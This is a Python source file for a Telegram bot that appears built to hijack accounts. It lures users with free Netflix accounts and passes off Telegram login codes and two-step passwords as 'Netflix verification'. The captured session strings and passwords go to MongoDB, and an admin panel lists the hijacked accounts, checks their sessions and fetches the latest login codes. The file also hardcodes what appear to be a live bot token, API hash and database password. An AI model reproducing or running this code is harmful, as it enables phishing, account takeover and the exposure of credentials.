"""
Netflix OTP Bot - Professional UI with Admin/User separation
Updated with account re-login support and 2FA flow fix
"""

import os
import logging
from datetime import datetime, timedelta
from bson import ObjectId
from pymongo import MongoClient
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Import account manager
from account import AccountManager

# ========================
# CONFIGURATION
# ========================
BOT_TOKEN = os.getenv('BOT_TOKEN', '8519826315:AAHbIs3wdmNwfSoWN3LxAetdmNsqllUfJLs')
ADMIN_ID = int(os.getenv('ADMIN_ID', '7308740606'))

# Pyrogram API credentials
API_ID = int(os.getenv('API_ID', '6435225'))
API_HASH = os.getenv('API_HASH', '4e984ea35f854762dcde906dce426c2d')

# MongoDB
MONGO_URL = os.getenv('MONGO_URL', 'mongodb+srv://Alisha:Alisha123@cluster0.yqcpftw.mongodb.net/?retryWrites=true&w=majority')

# Netflix Theme Images
NETFLIX_MAIN_IMAGE = "https://files.catbox.moe/hihx1r.jpg"
NETFLIX_WELCOME_IMAGE = "https://files.catbox.moe/hihx1r.jpg"

# Pagination
ACCOUNTS_PER_PAGE = 5
# ========================
# SETUP
# ========================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Initialize database
try:
    mongo_client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
    mongo_client.server_info()  # Test connection
    db = mongo_client.otp_bot
    accounts_col = db.accounts
    otp_logs_col = db.otp_logs
    users_col = db.users
    logger.info("✅ MongoDB connected successfully")
except Exception as e:
    logger.error(f"❌ MongoDB connection failed: {e}")
    raise

# Initialize account manager
account_manager = AccountManager(API_ID, API_HASH)

# Store temporary login states
login_states = {}  # {user_id: {step: "phone", phone: "", phone_code_hash: "", session_key: "", user_type: ""}}

# Store pagination states
pagination_states = {}  # {user_id: {page: 1, total_pages: x}}

# Store current message IDs for each user
user_current_messages = {}  # {user_id: message_id}

# ========================
# UTILITY FUNCTIONS
# ========================
def cleanup_old_logs():
    """Delete OTP logs older than 24 hours"""
    try:
        cutoff_time = datetime.utcnow() - timedelta(hours=24)
        result = otp_logs_col.delete_many({"fetched_at": {"$lt": cutoff_time}})
        if result.deleted_count > 0:
            logger.info(f"🧹 Cleaned up {result.deleted_count} old OTP logs")
        return result.deleted_count
    except Exception as e:
        logger.error(f"Cleanup error: {e}")
        return 0

def is_admin(user_id):
    """Check if user is admin"""
    return str(user_id) == str(ADMIN_ID)

def ensure_user_exists(user_id, user_name=None, username=None):
    """Ensure user exists in database"""
    user = users_col.find_one({"user_id": user_id})
    if not user:
        user_data = {
            "user_id": user_id,
            "name": user_name or "Unknown",
            "username": username,
            "is_admin": is_admin(user_id),
            "created_at": datetime.utcnow(),
            "last_seen": datetime.utcnow()
        }
        users_col.insert_one(user_data)
        logger.info(f"New user registered: {user_id}")
    else:
        # Update last seen
        users_col.update_one(
            {"user_id": user_id},
            {"$set": {"last_seen": datetime.utcnow()}}
        )
    return user

def format_phone(phone):
    """Format phone number for display"""
    if not phone:
        return "N/A"
    return phone if len(phone) <= 15 else f"{phone[:12]}..."

def get_valid_accounts_count():
    """Get count of accounts with valid session strings"""
    try:
        # Count accounts with non-empty session_string
        count = accounts_col.count_documents({
            "session_string": {"$exists": True, "$ne": None, "$ne": ""},
            "status": {"$ne": "invalid"}
        })
        return count
    except Exception as e:
        logger.error(f"Count valid accounts error: {e}")
        return 0

def get_valid_accounts(page=1):
    """Get paginated accounts (show all, but mark invalid ones)"""
    try:
        skip = (page - 1) * ACCOUNTS_PER_PAGE
        
        # Get all accounts (including those being re-logged)
        accounts = list(accounts_col.find(
            {},
            {"phone": 1, "_id": 1, "has_2fa": 1, "session_string": 1, "status": 1}
        ).sort("created_at", -1).skip(skip).limit(ACCOUNTS_PER_PAGE))
        
        # Verify session strings and update status
        for account in accounts:
            session_string = account.get("session_string", "")
            if session_string and session_string.strip():
                try:
                    # Try to create client to verify session
                    client = account_manager.get_client_from_session(session_string)
                    if client and client.is_connected:
                        # Update status to active if was invalid
                        if account.get("status") == "invalid":
                            accounts_col.update_one(
                                {"_id": account["_id"]},
                                {"$set": {"status": "active"}}
                            )
                            account["status"] = "active"
                    if client:
                        client.disconnect()
                except Exception as e:
                    # Session is invalid
                    logger.error(f"Session invalid for {account['phone']}: {e}")
                    accounts_col.update_one(
                        {"_id": account["_id"]},
                        {"$set": {"status": "invalid"}}
                    )
                    account["status"] = "invalid"
            else:
                # No session string
                accounts_col.update_one(
                    {"_id": account["_id"]},
                    {"$set": {"status": "invalid"}}
                )
                account["status"] = "invalid"
        
        total = accounts_col.count_documents({})
        total_pages = (total + ACCOUNTS_PER_PAGE - 1) // ACCOUNTS_PER_PAGE
        
        return accounts, total_pages
    except Exception as e:
        logger.error(f"Get accounts error: {e}")
        return [], 1

def get_total_otp_logs_24h():
    """Get total OTP logs from last 24 hours"""
    try:
        cutoff_time = datetime.utcnow() - timedelta(hours=24)
        count = otp_logs_col.count_documents({"fetched_at": {"$gte": cutoff_time}})
        return count
    except Exception as e:
        logger.error(f"Count OTP logs error: {e}")
        return 0

def save_account(phone, session_string, has_2fa=False, two_step_password=None, added_by=None):
    """Save or update account to database"""
    try:
        # Check if account already exists
        existing = accounts_col.find_one({"phone": phone})
        
        account_data = {
            "phone": phone,
            "session_string": session_string,
            "has_2fa": has_2fa,
            "two_step_password": two_step_password,
            "updated_at": datetime.utcnow(),
            "added_by": added_by,
            "status": "active"
        }
        
        if existing:
            # Update existing account
            accounts_col.update_one(
                {"phone": phone},
                {"$set": account_data}
            )
            logger.info(f"Account updated: {phone}")
        else:
            # Create new account
            account_data["created_at"] = datetime.utcnow()
            accounts_col.insert_one(account_data)
            logger.info(f"Account saved: {phone}")
        
        return True
    except Exception as e:
        logger.error(f"Save account error: {e}")
        return False

def save_otp_log(phone, otp, fetched_by=None):
    """Save OTP fetch log"""
    try:
        log_data = {
            "phone": phone,
            "otp": otp,
            "fetched_by": fetched_by,
            "fetched_at": datetime.utcnow()
        }
        otp_logs_col.insert_one(log_data)
        logger.info(f"OTP logged for {phone}")
        return True
    except Exception as e:
        logger.error(f"Save OTP log error: {e}")
        return False

def update_user_message(user_id, message_id):
    """Update current message for user"""
    user_current_messages[user_id] = message_id

def get_user_current_message(user_id):
    """Get current message ID for user"""
    return user_current_messages.get(user_id)

def send_or_edit_message(chat_id, user_id, text, markup=None, parse_mode="HTML", photo_url=None):
    """Send or edit message in single message flow"""
    current_msg_id = get_user_current_message(user_id)
    
    try:
        if current_msg_id:
            # Try to edit existing message
            try:
                if photo_url:
                    # Can't edit photo, so delete and send new
                    try:
                        bot.delete_message(chat_id, current_msg_id)
                    except:
                        pass
                    msg = bot.send_photo(
                        chat_id,
                        photo_url,
                        caption=text,
                        parse_mode=parse_mode,
                        reply_markup=markup
                    )
                else:
                    bot.edit_message_text(
                        text,
                        chat_id=chat_id,
                        message_id=current_msg_id,
                        parse_mode=parse_mode,
                        reply_markup=markup
                    )
                    msg = type('obj', (object,), {'message_id': current_msg_id})()
            except:
                # If edit fails, delete and send new
                try:
                    bot.delete_message(chat_id, current_msg_id)
                except:
                    pass
                if photo_url:
                    msg = bot.send_photo(
                        chat_id,
                        photo_url,
                        caption=text,
                        parse_mode=parse_mode,
                        reply_markup=markup
                    )
                else:
                    msg = bot.send_message(
                        chat_id,
                        text,
                        parse_mode=parse_mode,
                        reply_markup=markup
                    )
        else:
            # No existing message, send new
            if photo_url:
                msg = bot.send_photo(
                    chat_id,
                    photo_url,
                    caption=text,
                    parse_mode=parse_mode,
                    reply_markup=markup
                )
            else:
                msg = bot.send_message(
                    chat_id,
                    text,
                    parse_mode=parse_mode,
                    reply_markup=markup
                )
        
        # Update current message
        update_user_message(user_id, msg.message_id)
        return msg.message_id
        
    except Exception as e:
        logger.error(f"Send/edit message error: {e}")
        return None

# ========================
# ADMIN LOGIN FLOW
# ========================
@bot.callback_query_handler(func=lambda call: call.data == "admin_add_account")
def handle_admin_add_account(call):
    """Start login process for admin to add account"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "Admin only feature", show_alert=True)
        return
    
    # Set state to ask for phone number
    login_states[user_id] = {"step": "ask_phone", "user_type": "admin"}
    
    login_text = """
<b>🔐 Add New Account</b>

Enter phone number with country code:

<b>Example:</b> +919876543210

<i>This will add/update the account in database for OTP fetching.</i>
"""
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin"))
    
    send_or_edit_message(
        call.message.chat.id,
        user_id,
        login_text,
        markup=markup,
        photo_url=NETFLIX_MAIN_IMAGE
    )

# ========================
# BOT HANDLERS - START
# ========================
@bot.message_handler(commands=['start'])
def handle_start(message):
    """Handle /start command for all users"""
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    username = message.from_user.username
    
    # Ensure user exists in database
    ensure_user_exists(user_id, user_name, username)
    
    # Clear states
    if user_id in login_states:
        del login_states[user_id]
    if user_id in pagination_states:
        del pagination_states[user_id]
    
    # Show appropriate menu based on user type
    if is_admin(user_id):
        show_admin_dashboard(user_id, message.chat.id)
    else:
        show_netflix_welcome(user_id, message.chat.id)

def show_netflix_welcome(user_id, chat_id=None):
    """Show Netflix welcome screen for normal users"""
    if not chat_id:
        chat_id = user_id
    
    welcome_text = """
<b>🎬 Welcome To Netflix On Your Number Bot 🎬</b>

<code>Netflix mai account tumhare account mai ajayega</code>

<b>✨ Features:</b>
• Premium Netflix Accounts 🎭
• 4K Ultra HD Streaming 🎥
• Multiple Profiles 👥
• Ad-Free Experience 🚫

<b>📲 How to Get Netflix:</b>
1. Click "Get Netflix Now" below
2. Enter your phone number
3. Verify with OTP
4. Receive Netflix account in 48 hours

<code>Your request successfully submitted. Netflix review in 48 hours then successfully send account on your number.</code>

<b>🔥 Limited Time Offer!</b>
"""
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🎬 Get Netflix Now", callback_data="get_netflix_now"))
    
    send_or_edit_message(
        chat_id,
        user_id,
        welcome_text,
        markup=markup,
        photo_url=NETFLIX_WELCOME_IMAGE
    )

def show_admin_dashboard(user_id, chat_id=None):
    """Show admin dashboard"""
    if not chat_id:
        chat_id = user_id
    
    if not is_admin(user_id):
        show_netflix_welcome(user_id, chat_id)
        return
    
    # Cleanup old logs
    cleaned_count = cleanup_old_logs()
    
    total_accounts = get_valid_accounts_count()
    total_otp_logs = get_total_otp_logs_24h()
    
    admin_text = f"""
<b>👑 Netflix Admin Panel</b>

<b>📊 Statistics:</b>
• Active Accounts: {total_accounts}
• OTP Logs (24h): {total_otp_logs}
• Logs Cleaned: {cleaned_count}

<b>🛠️ Management Tools:</b>
"""
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("👁 View Accounts", callback_data="view_accounts_1"),
        InlineKeyboardButton("🔐 Add Account", callback_data="admin_add_account")
    )
    markup.add(
        InlineKeyboardButton("📊 OTP Logs", callback_data="otp_logs"),
        InlineKeyboardButton("🔄 Refresh", callback_data="refresh_admin")
    )
    
    send_or_edit_message(
        chat_id,
        user_id,
        admin_text,
        markup=markup,
        photo_url=NETFLIX_MAIN_IMAGE
    )

# ========================
# USER FLOW - NETFLIX LOGIN
# ========================
@bot.callback_query_handler(func=lambda call: call.data == "get_netflix_now")
def handle_get_netflix_now(call):
    """Start Netflix login process for users"""
    user_id = call.from_user.id
    
    # Clear any existing states
    if user_id in pagination_states:
        del pagination_states[user_id]
    
    # Set state to ask for phone number
    login_states[user_id] = {"step": "ask_phone", "user_type": "netflix"}
    
    # Show phone input
    login_text = """
<b>📱 Netflix Account Setup</b>

<code>Enter your phone number with country code to get Netflix account.</code>

<b>Example:</b> +919876543210

<i>⚠️ Netflix will send verification code to this number</i>
"""
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix"))
    
    send_or_edit_message(
        call.message.chat.id,
        user_id,
        login_text,
        markup=markup,
        photo_url=NETFLIX_WELCOME_IMAGE
    )

@bot.callback_query_handler(func=lambda call: call.data == "cancel_netflix")
def handle_cancel_netflix(call):
    """Cancel Netflix login"""
    user_id = call.from_user.id
    
    if user_id in login_states:
        del login_states[user_id]
    
    show_netflix_welcome(user_id, call.message.chat.id)

# ========================
# PHONE NUMBER HANDLER (For both users and admin)
# ========================
@bot.message_handler(func=lambda m: login_states.get(m.from_user.id, {}).get("step") == "ask_phone")
def handle_phone_input(message):
    """Handle phone number input from both users and admin"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    state = login_states.get(user_id)
    if not state:
        if is_admin(user_id):
            show_admin_dashboard(user_id, chat_id)
        else:
            show_netflix_welcome(user_id, chat_id)
        return
    
    phone = message.text.strip()
    
    # Basic phone validation
    if not phone.startswith('+') or len(phone) < 10:
        if state.get("user_type") == "admin":
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin")
            )
            photo = NETFLIX_MAIN_IMAGE
            error_title = "Invalid Format"
        else:
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
            )
            photo = NETFLIX_WELCOME_IMAGE
            error_title = "Invalid Phone Number"
        
        error_text = f"""
<b>❌ {error_title}</b>

Please enter valid phone number with country code.

<b>Example:</b> +919876543210

Enter phone number again:
"""
        
        send_or_edit_message(
            chat_id,
            user_id,
            error_text,
            markup=markup,
            photo_url=photo
        )
        return
    
    # Send OTP using Pyrogram
    if state.get("user_type") == "admin":
        sending_text = """
<b>⏳ Sending OTP...</b>

<i>Please wait while we send verification code to the phone number.</i>
"""
        photo = NETFLIX_MAIN_IMAGE
    else:
        sending_text = """
<b>⏳ Netflix Verification</b>

<code>Netflix is sending verification code to your phone number...</code>

<i>This may take a few seconds.</i>
"""
        photo = NETFLIX_WELCOME_IMAGE
    
    send_or_edit_message(
        chat_id,
        user_id,
        sending_text,
        photo_url=photo
    )
    
    try:
        result = account_manager.send_otp(phone)
        
        if not result.get("success"):
            error_msg = result.get("error", "Unknown error")
            
            if state.get("user_type") == "admin":
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin")
                )
                error_photo = NETFLIX_MAIN_IMAGE
                error_title = "Failed to send OTP"
            else:
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
                )
                error_photo = NETFLIX_WELCOME_IMAGE
                error_title = "Netflix Verification Failed"
            
            error_text = f"""
<b>❌ {error_title}</b>

{error_msg}

Enter phone number again:
"""
            
            send_or_edit_message(
                chat_id,
                user_id,
                error_text,
                markup=markup,
                photo_url=error_photo
            )
            return
        
        # Update state
        login_states[user_id] = {
            "step": "ask_otp",
            "phone": phone,
            "phone_code_hash": result["phone_code_hash"],
            "session_key": result["session_key"],
            "user_type": state.get("user_type", "netflix")
        }
        
        if state.get("user_type") == "admin":
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin")
            )
            otp_photo = NETFLIX_MAIN_IMAGE
            otp_text = f"""
<b>✅ OTP Sent Successfully</b>

Phone: <code>{phone}</code>

Enter the 5-digit OTP code received on Telegram:
"""
        else:
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
            )
            otp_photo = NETFLIX_WELCOME_IMAGE
            otp_text = f"""
<b>📩 Netflix Verification Code Sent</b>

<code>Netflix sent you a message on your Telegram with 5 digit code for Netflix verification.</code>

<b>Phone:</b> <code>{phone}</code>

Enter the 5-digit verification code:
"""
        
        send_or_edit_message(
            chat_id,
            user_id,
            otp_text,
            markup=markup,
            photo_url=otp_photo
        )
        
    except Exception as e:
        logger.error(f"Send OTP error: {e}")
        
        error_text = f"""
<b>❌ Connection Error</b>

Failed to send verification code.

Error: {str(e)}

Start again with /start
"""
        
        send_or_edit_message(
            chat_id,
            user_id,
            error_text,
            photo_url=NETFLIX_WELCOME_IMAGE
        )
        
        if user_id in login_states:
            del login_states[user_id]

# ========================
# OTP HANDLER (For both users and admin)
# ========================
@bot.message_handler(func=lambda m: login_states.get(m.from_user.id, {}).get("step") == "ask_otp")
def handle_otp_input(message):
    """Handle OTP input from both users and admin"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    state = login_states.get(user_id)
    if not state:
        if is_admin(user_id):
            show_admin_dashboard(user_id, chat_id)
        else:
            show_netflix_welcome(user_id, chat_id)
        return
    
    otp_code = message.text.strip()
    
    if not otp_code.isdigit() or len(otp_code) != 5:
        if state.get("user_type") == "admin":
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin")
            )
            error_photo = NETFLIX_MAIN_IMAGE
            error_text = """
<b>❌ Invalid Code</b>

OTP must be exactly 5 digits.

Enter OTP code again:
"""
        else:
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
            )
            error_photo = NETFLIX_WELCOME_IMAGE
            error_text = """
<b>❌ Invalid Verification Code</b>

Netflix verification code must be 5 digits.

Enter the code again:
"""
        
        send_or_edit_message(
            chat_id,
            user_id,
            error_text,
            markup=markup,
            photo_url=error_photo
        )
        return
    
    # Show verifying message
    if state.get("user_type") == "admin":
        verify_text = """
<b>⏳ Verifying OTP...</b>

<i>Please wait while we verify the code.</i>
"""
        verify_photo = NETFLIX_MAIN_IMAGE
    else:
        verify_text = """
<b>⏳ Verifying Netflix Code...</b>

<code>Checking verification code with Netflix servers...</code>
"""
        verify_photo = NETFLIX_WELCOME_IMAGE
    
    send_or_edit_message(
        chat_id,
        user_id,
        verify_text,
        photo_url=verify_photo
    )
    
    try:
        # Check if we need to handle 2FA password from previous step
        two_step_password = None
        if "two_step_password" in state:
            two_step_password = state["two_step_password"]
        
        result = account_manager.verify_otp(
            state["session_key"],
            otp_code,
            state["phone"],
            state["phone_code_hash"],
            two_step_password
        )
        
        if result.get("needs_2fa"):
            # 2FA required - ask for password
            login_states[user_id]["step"] = "ask_2fa_password"
            
            if state.get("user_type") == "admin":
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin")
                )
                photo = NETFLIX_MAIN_IMAGE
                text = """
<b>🔐 Two-Step Verification Required</b>

This account has two-step verification enabled.

Enter your 2-step verification password:
"""
            else:
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
                )
                photo = NETFLIX_WELCOME_IMAGE
                text = """
<b>🔒 Netflix Two-Step Verification</b>

<code>This Netflix account has extra security enabled.</code>

Enter your Netflix account password:
"""
            
            send_or_edit_message(
                chat_id,
                user_id,
                text,
                markup=markup,
                photo_url=photo
            )
            return
        
        if not result.get("success"):
            error_msg = result.get("error", "Unknown error")
            
            if state.get("user_type") == "admin":
                error_text = f"""
<b>❌ OTP Verification Failed</b>

{error_msg}

Start again with /start
"""
                error_photo = NETFLIX_MAIN_IMAGE
            else:
                error_text = f"""
<b>❌ Netflix Verification Failed</b>

<code>Could not verify with Netflix servers.</code>

Error: {error_msg}

Start again with /start
"""
                error_photo = NETFLIX_WELCOME_IMAGE
            
            send_or_edit_message(
                chat_id,
                user_id,
                error_text,
                photo_url=error_photo
            )
            
            if user_id in login_states:
                del login_states[user_id]
            return
        
        # Save account to database
        user_type = state.get("user_type", "netflix")
        added_by = user_id if user_type == "admin" else "netflix_user"
        
        saved = save_account(
            state["phone"],
            result["session_string"],
            result["has_2fa"],
            result.get("two_step_password"),
            added_by
        )
        
        # Show success message
        if user_type == "admin":
            success_text = f"""
<b>✅ Account Added/Updated Successfully!</b>

<b>📱 Phone:</b> <code>{state['phone']}</code>
<b>🔐 2FA:</b> {'✅ Enabled' if result['has_2fa'] else '❌ Disabled'}
<b>Status:</b> {'✅ Updated existing account' if result.get('updated_existing') else '✅ Added new account'}

Account has been added/updated in database and is now available for OTP fetching.
"""
            success_photo = NETFLIX_MAIN_IMAGE
            
            # Clear state and show dashboard
            if user_id in login_states:
                del login_states[user_id]
            
            show_admin_dashboard(user_id, chat_id)
            
        else:
            success_text = f"""
<b>🎉 Netflix Request Submitted Successfully!</b>

<code>Your request successfully submitted. Netflix review in 48 hours then successfully send account on your number.</code>

<b>📱 Your Number:</b> <code>{state['phone']}</code>
<b>⏳ Status:</b> Under Review
<b>📅 Estimated:</b> 48 Hours

<i>You will receive Netflix account details on this number once approved.</i>

Thank you for choosing Netflix! 🎬
"""
            success_photo = NETFLIX_WELCOME_IMAGE
            
            # Clear state
            if user_id in login_states:
                del login_states[user_id]
            
            # Show success message
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🏠 Back to Home", callback_data="back_to_welcome"))
            
            send_or_edit_message(
                chat_id,
                user_id,
                success_text,
                markup=markup,
                photo_url=success_photo
            )
        
    except Exception as e:
        logger.error(f"Verify OTP error: {e}")
        
        error_text = f"""
<b>❌ Verification Error</b>

Failed to verify code.

Error: {str(e)}

Start again with /start
"""
        
        send_or_edit_message(
            chat_id,
            user_id,
            error_text,
            photo_url=NETFLIX_WELCOME_IMAGE
        )
        
        if user_id in login_states:
            del login_states[user_id]

# ========================
# 2FA PASSWORD HANDLER (For both users and admin)
# ========================
@bot.message_handler(func=lambda m: login_states.get(m.from_user.id, {}).get("step") == "ask_2fa_password")
def handle_2fa_password_input(message):
    """Handle 2FA password input from both users and admin"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    state = login_states.get(user_id)
    if not state:
        if is_admin(user_id):
            show_admin_dashboard(user_id, chat_id)
        else:
            show_netflix_welcome(user_id, chat_id)
        return
    
    password = message.text.strip()
    
    if not password:
        if state.get("user_type") == "admin":
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin")
            )
            error_photo = NETFLIX_MAIN_IMAGE
            error_text = """
<b>❌ Password Required</b>

Password cannot be empty.

Enter 2-step verification password again:
"""
        else:
            markup = InlineKeyboardMarkup().add(
                InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
            )
            error_photo = NETFLIX_WELCOME_IMAGE
            error_text = """
<b>❌ Password Required</b>

Netflix account password cannot be empty.

Enter password again:
"""
        
        send_or_edit_message(
            chat_id,
            user_id,
            error_text,
            markup=markup,
            photo_url=error_photo
        )
        return
    
    # Store password in state and go back to OTP verification
    login_states[user_id]["two_step_password"] = password
    login_states[user_id]["step"] = "ask_otp"
    
    # Show message that we're continuing verification
    if state.get("user_type") == "admin":
        continue_text = """
<b>⏳ Continuing Verification...</b>

<i>Now verifying with 2FA password...</i>

Please enter the OTP code again:
"""
        continue_photo = NETFLIX_MAIN_IMAGE
    else:
        continue_text = """
<b>⏳ Netflix Security Verification</b>

<code>Now verifying with Netflix account password...</code>

Please enter the verification code again:
"""
        continue_photo = NETFLIX_WELCOME_IMAGE
    
    send_or_edit_message(
        chat_id,
        user_id,
        continue_text,
        photo_url=continue_photo
    )

# ========================
# ADMIN ONLY FEATURES
# ========================
@bot.callback_query_handler(func=lambda call: call.data == "back_to_admin")
def handle_back_to_admin(call):
    """Go back to admin dashboard"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True)
        show_netflix_welcome(user_id, call.message.chat.id)
        return
    
    # Clear states
    if user_id in login_states:
        del login_states[user_id]
    if user_id in pagination_states:
        del pagination_states[user_id]
    
    show_admin_dashboard(user_id, call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == "refresh_admin")
def handle_refresh_admin(call):
    """Refresh admin dashboard"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True)
        return
    
    show_admin_dashboard(user_id, call.message.chat.id)
    bot.answer_callback_query(call.id, "✅ Dashboard refreshed")

@bot.callback_query_handler(func=lambda call: call.data.startswith("view_accounts_"))
def handle_view_accounts(call):
    """Show paginated accounts (admin only)"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True)
        return
    
    # Get page number from callback data
    page = int(call.data.replace("view_accounts_", ""))
    
    # Fetch paginated accounts
    accounts, total_pages = get_valid_accounts(page)
    
    if not accounts:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔐 Add Account", callback_data="admin_add_account"))
        markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back_to_admin"))
        
        send_or_edit_message(
            call.message.chat.id,
            user_id,
            "<b>📱 No Accounts Found</b>\n\nAdd your first account to get started.",
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE
        )
        return
    
    # Store pagination state
    pagination_states[user_id] = {"page": page, "total_pages": total_pages}
    
    # Create account list text
    account_text = f"<b>📱 All Accounts (Page {page}/{total_pages})</b>\n\n"
    start_num = (page - 1) * ACCOUNTS_PER_PAGE + 1
    
    for idx, account in enumerate(accounts, start_num):
        phone_display = format_phone(account["phone"])
        status = account.get("status", "unknown")
        
        if status == "active":
            status_icon = "✅"
            has_2fa = "🔒" if account.get("has_2fa") else "🔓"
            account_text += f"{idx}. {status_icon} {has_2fa} <code>{phone_display}</code>\n"
        else:
            status_icon = "❌"
            account_text += f"{idx}. {status_icon} <code>{phone_display}</code> <i>(Invalid Session)</i>\n"
    
    # Create keyboard with account buttons and pagination
    markup = InlineKeyboardMarkup(row_width=2)
    
    # Add accounts as buttons (only active ones)
    for account in accounts:
        if account.get("status") == "active":
            phone_display = format_phone(account["phone"])
            short_phone = phone_display[:10] + "..." if len(phone_display) > 10 else phone_display
            has_2fa = "🔒" if account.get("has_2fa") else ""
            markup.add(InlineKeyboardButton(
                f"{has_2fa} {short_phone}",
                callback_data=f"account_{account['_id']}"
            ))
    
    # Add pagination buttons
    nav_buttons = []
    if page > 1:
        nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"view_accounts_{page-1}"))
    if page < total_pages:
        nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"view_accounts_{page+1}"))
    
    if nav_buttons:
        markup.row(*nav_buttons)
    
    markup.add(InlineKeyboardButton("🔐 Add Account", callback_data="admin_add_account"))
    markup.add(InlineKeyboardButton("⬅️ Back to Dashboard", callback_data="back_to_admin"))
    
    send_or_edit_message(
        call.message.chat.id,
        user_id,
        account_text,
        markup=markup,
        photo_url=NETFLIX_MAIN_IMAGE
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("account_"))
def handle_account_selection(call):
    """Show actions for selected account (admin only)"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True)
        return
    
    account_id = call.data.replace("account_", "")
    
    try:
        # Get account
        account = accounts_col.find_one({"_id": ObjectId(account_id)})
        
        if not account:
            bot.answer_callback_query(call.id, "Account not found", show_alert=True)
            page = pagination_states.get(user_id, {}).get("page", 1)
            handle_view_accounts(type('obj', (object,), {
                'from_user': type('obj', (object,), {'id': user_id})(),
                'message': call.message,
                'data': f"view_accounts_{page}"
            })())
            return
        
        # Show account actions
        markup = InlineKeyboardMarkup()
        
        # Check if account has valid session
        session_string = account.get("session_string", "")
        if session_string and session_string.strip():
            try:
                # Verify session is still valid
                client = account_manager.get_client_from_session(session_string)
                if client and client.is_connected:
                    markup.add(InlineKeyboardButton("🔢 Get Latest OTP", callback_data=f"get_otp_{account_id}"))
                    client.disconnect()
                else:
                    markup.add(InlineKeyboardButton("🔄 Re-login Account", callback_data=f"relogin_{account_id}"))
            except:
                markup.add(InlineKeyboardButton("🔄 Re-login Account", callback_data=f"relogin_{account_id}"))
        else:
            markup.add(InlineKeyboardButton("🔄 Re-login Account", callback_data=f"relogin_{account_id}"))
        
        # Add back button with page context
        if user_id in pagination_states:
            page = pagination_states[user_id]["page"]
            markup.add(InlineKeyboardButton("⬅️ Back to List", callback_data=f"view_accounts_{page}"))
        else:
            markup.add(InlineKeyboardButton("⬅️ Back to List", callback_data="view_accounts_1"))
        
        phone_display = format_phone(account["phone"])
        has_2fa = "✅ Enabled" if account.get("has_2fa") else "❌ Disabled"
        status = "✅ Active" if account.get("status") == "active" else "❌ Invalid"
        
        account_text = f"""
<b>📱 Account Details</b>

<b>Phone:</b> <code>{phone_display}</code>
<b>2FA:</b> {has_2fa}
<b>Status:</b> {status}
<b>Added:</b> {account.get('created_at', datetime.utcnow()).strftime('%d %b %Y')}

Choose an action:
"""
        
        send_or_edit_message(
            call.message.chat.id,
            user_id,
            account_text,
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE
        )
        
    except Exception as e:
        logger.error(f"Account selection error: {e}")
        bot.answer_callback_query(call.id, "Error loading account", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("relogin_"))
def handle_relogin_account(call):
    """Re-login an existing account"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True)
        return
    
    account_id = call.data.replace("relogin_", "")
    
    try:
        # Get account
        account = accounts_col.find_one({"_id": ObjectId(account_id)})
        
        if not account:
            bot.answer_callback_query(call.id, "Account not found", show_alert=True)
            return
        
        # Set state for re-login
        login_states[user_id] = {
            "step": "ask_phone",
            "user_type": "admin",
            "relogin_account_id": account_id,
            "existing_phone": account["phone"]
        }
        
        # Show phone input with existing phone pre-filled
        login_text = f"""
<b>🔄 Re-login Account</b>

Phone number: <code>{account['phone']}</code>

This will update the session for this account.

Click below to start re-login process:
"""
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔄 Start Re-login", callback_data="start_relogin"))
